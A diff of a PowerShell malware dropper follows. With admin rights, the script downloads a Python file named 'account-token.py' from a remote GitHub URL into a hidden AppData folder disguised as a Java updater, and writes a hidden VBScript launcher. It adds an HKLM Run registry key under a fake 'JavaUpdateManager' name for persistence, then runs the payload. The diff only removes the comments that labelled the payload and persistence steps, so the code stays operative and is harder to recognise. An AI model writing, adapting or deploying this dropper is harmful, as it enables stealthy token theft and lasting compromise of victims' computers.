@@ -4,7 +4,6 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     exit
 }
 
-# Simplified Path: No CLSID, just a hidden folder in AppData
 $GITHUB_RAW_URL = "https://raw.githubusercontent.com/get-activated/com.mojang.minecraft/refs/heads/main/account-token.py"
 $InstallDir = "$env:APPDATA\Microsoft\JavaUpdater"
 $AgentPath = "$InstallDir\win_sys_host.pyw"
@@ -14,7 +13,6 @@ if (-not (Test-Path $InstallDir)) {
     New-Item -ItemType Directory -Force -Path $InstallDir | Out-Null
 }
 
-# --- Python Setup ---
 $pythonInstalled = $false
 try {
     $pythonVersion = & python --version 2>&1
@@ -36,11 +34,8 @@ if (-not $pythonInstalled) {
     $pythonwExe = "$PythonPath\SysHealthHost.exe"
 }
 
-# --- Download Payload ---
 Invoke-WebRequest -Uri $GITHUB_RAW_URL -OutFile $AgentPath -UseBasicParsing
 
-# --- FIXED VBScript Launcher ---
-# We use [char]34 to build the quotes to prevent "Unterminated string" errors
 $vbsLauncher = "$InstallDir\launcher.vbs"
 $q = [char]34 
 $vbsLine1 = "Set WshShell = CreateObject(" + $q + "WScript.Shell" + $q + ")"
@@ -50,11 +45,10 @@ $vbsContent = $vbsLine1 + "`n" + $vbsLine2
 Set-Content -Path $vbsLauncher -Value $vbsContent -Encoding ASCII
 attrib +h +s $vbsLauncher
 
-# --- Persistence ---
+
 $RegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
 Set-ItemProperty -Path $RegPath -Name "JavaUpdateManager" -Value "wscript.exe $q$vbsLauncher$q" -Force
 
-# --- Run it now ---
 Start-Process "wscript.exe" -ArgumentList "$q$vbsLauncher$q"
 Write-Host "Installation Complete." -ForegroundColor Green
 exit
